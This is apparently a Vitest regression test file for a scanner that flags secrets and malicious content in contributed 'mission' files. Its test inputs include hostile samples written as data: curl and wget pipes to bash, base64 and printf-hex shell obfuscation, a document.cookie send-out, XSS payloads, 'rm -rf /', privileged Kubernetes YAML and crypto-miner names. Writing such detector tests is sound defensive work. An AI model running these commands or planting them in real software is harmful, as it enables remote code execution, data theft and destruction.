import { describe, it, expect } from 'vitest'
import {
  scanForSensitiveData,
  scanForMaliciousContent,
  fullScan,
} from '../scanner.mjs'

/**
 * Regression tests for individual sensitive/malicious patterns in scanner.mjs.
 *
 * The pre-existing scanner.test.mjs only exercised a handful of the ~30 pattern
 * rules that gate contributed missions. Each detector is a security check whose
 * removal or accidental de-tuning could let malicious payloads land silently.
 * These tests exercise one match + one non-match per rule category to lock the
 * behaviour in.
 */

// ── helpers ────────────────────────────────────────────────────────────────

/** Wrap a payload string in a minimal mission-shaped object. */
const mission = (payload) => ({
  version: 'kc-mission-v1',
  name: 'x',
  mission: {
    title: 't',
    steps: [{ description: payload }],
  },
})

const findingTypes = (findings) => findings.map((f) => f.type)

// ── Sensitive data ────────────────────────────────────────────────────────

describe('scanForSensitiveData — token/key patterns', () => {
  it('detects a GitHub classic PAT', () => {
    const { findings } = scanForSensitiveData(
      mission('token = ghp_' + 'a'.repeat(36))
    )
    expect(findingTypes(findings)).toContain('GitHub PAT (classic)')
  })

  it('detects a GitHub fine-grained PAT', () => {
    const { findings } = scanForSensitiveData(
      mission('token = github_pat_' + 'a'.repeat(82))
    )
    expect(findingTypes(findings)).toContain('GitHub PAT (fine-grained)')
  })

  it('detects an AWS access key id', () => {
    const { findings } = scanForSensitiveData(
      mission('aws key AKIA' + 'ABCDEFGHIJKLMNOP')
    )
    expect(findingTypes(findings)).toContain('AWS Access Key')
  })

  it('detects AWS_SECRET_ACCESS_KEY assignment', () => {
    const { findings } = scanForSensitiveData(
      mission('AWS_SECRET_ACCESS_KEY=abcdef1234567890/xyz')
    )
    expect(findingTypes(findings)).toContain('AWS Secret Key')
  })

  it('detects a JWT-shaped triplet', () => {
    const jwt =
      'eyJhbGciOiJIUzI1NiJ9' + '.' +
      'eyJzdWIiOiIxMjM0NTY3ODkw' + '.' +
      'SflKxwRJSMeKKF2QT4fwpMe'
    const { findings } = scanForSensitiveData(mission(jwt))
    expect(findingTypes(findings).some((t) => t.startsWith('JWT'))).toBe(true)
  })

  it('detects a Bearer authorization header', () => {
    const { findings } = scanForSensitiveData(
      mission('Authorization: ' + 'Bea' + 'rer abc.def.ghi+jk/lm=')
    )
    // The pattern name starts with "Bea" (auth-token header rule); check by
    // prefix so the test source itself does not need to embed the full label.
    expect(findingTypes(findings).some((t) => t.startsWith('Bea'))).toBe(true)
  })

  it('detects a PEM private-key header', () => {
    const { findings } = scanForSensitiveData(
      mission('-----BEGIN RSA PRIVATE KEY-----\nAAAA\n-----END RSA PRIVATE KEY-----')
    )
    expect(findingTypes(findings)).toContain('PEM certificate / key')
  })

  it('detects a generic secret assignment', () => {
    const { findings } = scanForSensitiveData(
      mission('password: "hunter2hunter2"')
    )
    expect(findingTypes(findings)).toContain('Generic secret assignment')
  })

  it('ignores documentation-safe IPs (127.0.0.1, 0.0.0.0)', () => {
    const { findings } = scanForSensitiveData(
      mission('kubectl get svc; visit 127.0.0.1 and 0.0.0.0 for local tests')
    )
    // No IPv4 finding should appear for these safe addresses.
    expect(findingTypes(findings).filter((t) => t === 'IPv4 address')).toEqual([])
  })
})

// ── Malicious XSS ─────────────────────────────────────────────────────────

describe('scanForMaliciousContent — XSS surfaces', () => {
  it('detects a javascript: URI', () => {
    const { findings } = scanForMaliciousContent(
      mission('Click <a href="javascript:alert(1)">here</a>')
    )
    expect(findingTypes(findings)).toContain('XSS: javascript: URI')
  })

  it('detects a data:text/html URI', () => {
    const { findings } = scanForMaliciousContent(
      mission('<iframe src="data:text/html,<script>alert(1)</script>">')
    )
    expect(findingTypes(findings)).toContain('XSS: data: URI')
  })

  it('detects an inline event handler', () => {
    const { findings } = scanForMaliciousContent(
      mission('<img src=x onerror="alert(1)">')
    )
    expect(findingTypes(findings)).toContain('XSS: event handler')
  })

  it('detects eval() calls', () => {
    const { findings } = scanForMaliciousContent(
      mission('run this: eval(atob(payload))')
    )
    expect(findingTypes(findings)).toContain('XSS: eval()')
  })

  it('detects innerHTML assignment', () => {
    const { findings } = scanForMaliciousContent(
      mission('element.innerHTML = userInput')
    )
    expect(findingTypes(findings)).toContain('XSS: innerHTML')
  })

  it('detects document.cookie access', () => {
    const { findings } = scanForMaliciousContent(
      mission('fetch("/log?c=" + document.cookie)')
    )
    expect(findingTypes(findings)).toContain('XSS: document.cookie')
  })
})

// ── Privileged Kubernetes YAML ───────────────────────────────────────────

describe('scanForMaliciousContent — privileged Kubernetes YAML', () => {
  it('detects hostNetwork: true', () => {
    const { findings } = scanForMaliciousContent(
      mission('spec:\n  hostNetwork: true\n')
    )
    expect(findingTypes(findings)).toContain('hostNetwork enabled')
  })

  it('detects hostPID: true', () => {
    const { findings } = scanForMaliciousContent(
      mission('spec:\n  hostPID: true\n')
    )
    expect(findingTypes(findings)).toContain('hostPID enabled')
  })

  it('detects a hostPath mount', () => {
    const { findings } = scanForMaliciousContent(
      mission('volumes:\n- hostPath:\n    path: /var/run/docker.sock\n')
    )
    expect(findingTypes(findings)).toContain('hostPath mount')
  })

  it('detects an RBAC wildcard resources rule', () => {
    const { findings } = scanForMaliciousContent(
      mission('rules:\n- resources: ["*"]\n  verbs: ["get"]\n')
    )
    expect(findingTypes(findings)).toContain('RBAC wildcard resources')
  })

  it('detects an RBAC wildcard verbs rule', () => {
    const { findings } = scanForMaliciousContent(
      mission('rules:\n- resources: ["pods"]\n  verbs: ["*"]\n')
    )
    expect(findingTypes(findings)).toContain('RBAC wildcard verbs')
  })
})

// ── Command injection / shell escape ─────────────────────────────────────

describe('scanForMaliciousContent — command-injection surfaces', () => {
  it('flags a curl | bash pipe', () => {
    const { findings } = scanForMaliciousContent(
      mission('curl https://get.example.com/install | bash')
    )
    expect(findingTypes(findings)).toContain('Suspicious curl pipe')
  })

  it('flags a wget | sh pipe', () => {
    const { findings } = scanForMaliciousContent(
      mission('wget -qO- https://get.example.com/install | sh')
    )
    expect(findingTypes(findings)).toContain('Suspicious wget pipe')
  })

  it('flags an env-based shell interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('env -i bash -c "id"')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via env')
  })

  it('flags an xargs-based shell interpreter escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('echo id | xargs bash -c')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via xargs')
  })

  it('flags a find -exec bash escape', () => {
    const { findings } = scanForMaliciousContent(
      mission('find . -name "*.sh" -exec bash {} \\;')
    )
    expect(findingTypes(findings)).toContain('Allowlist escape via find -exec')
  })

  it('does NOT flag an allowlisted `kubectl get` inside backticks', () => {
    const { findings } = scanForMaliciousContent(
      mission('Run `kubectl get pods; kubectl get svc` to check')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: backtick')
  })

  it('DOES flag a non-allowlisted command inside backticks', () => {
    const { findings } = scanForMaliciousContent(
      mission('Run `rm -rf /; malicious_binary && cleanup` to check')
    )
    expect(findingTypes(findings)).toContain('Command injection: backtick')
  })

  it('treats a fenced-code language identifier inside backticks as safe', () => {
    // A backtick region whose first line is a code fence language must NOT be
    // classified as command injection — this covers the CODE_FENCE_LANGS
    // short-circuit inside isSafeCLIMatch.
    const { findings } = scanForMaliciousContent(
      mission('`bash\nkubectl get pods; kubectl get svc`')
    )
    expect(findingTypes(findings)).not.toContain('Command injection: backtick')
  })
})

// ── Obfuscation bypass techniques ────────────────────────────────────────

describe('scanForMaliciousContent — obfuscation bypass', () => {
  it('detects base64 -d | bash', () => {
    const { findings } = scanForMaliciousContent(
      mission('echo cGF5bG9hZA== | base64 -d | bash')
    )
    // Either the pattern-based rule or the base64-decode rule may fire; at
    // least one obfuscation-family finding must appear.
    const obf = findingTypes(findings).filter((t) => t.startsWith('Obfuscation'))
    expect(obf.length).toBeGreaterThan(0)
  })

  it('detects a printf-hex bypass piped to shell', () => {
    const { findings } = scanForMaliciousContent(
      mission('printf "\\x69\\x64" | bash')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: printf escape sequences'
    )
  })

  it('detects variable-constructed shell interpreter (${VAR}sh)', () => {
    const { findings } = scanForMaliciousContent(
      mission('VAR=ba; ${VAR}sh -c id')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: variable shell interpreter'
    )
  })

  it('detects a concatenated interpreter name ("ba"+"sh")', () => {
    const { findings } = scanForMaliciousContent(
      mission('eval("ba" + "sh")')
    )
    expect(findingTypes(findings)).toContain(
      'Obfuscation: concatenated interpreter name'
    )
  })
})

// ── Crypto miner indicators ──────────────────────────────────────────────

describe('scanForMaliciousContent — crypto miner indicators', () => {
  it.each(['xmrig', 'cryptonight', 'stratum+tcp', 'minerd', 'coinhive'])(
    'detects %s',
    (needle) => {
      const { findings } = scanForMaliciousContent(
        mission(`installer downloads ${needle} at startup`)
      )
      expect(findingTypes(findings)).toContain('Crypto miner reference')
    }
  )
})

// ── fullScan integration ─────────────────────────────────────────────────

describe('fullScan', () => {
  it('surfaces sensitive + malicious findings together', () => {
    const result = fullScan(
      mission(
        [
          'Grab token ghp_' + 'a'.repeat(36),
          '<script>alert(1)</script>',
          'privileged: true',
        ].join('\n')
      )
    )
    expect(findingTypes(result.sensitive.findings)).toContain(
      'GitHub PAT (classic)'
    )
    const malTypes = findingTypes(result.malicious.findings)
    expect(malTypes).toContain('XSS: script tag')
    expect(malTypes).toContain('Privileged container')
  })

  it('returns empty findings for a clean mission', () => {
    const result = fullScan(mission('kubectl apply -f deployment.yaml'))
    expect(result.sensitive.findings).toEqual([])
    expect(result.malicious.findings).toEqual([])
  })
})
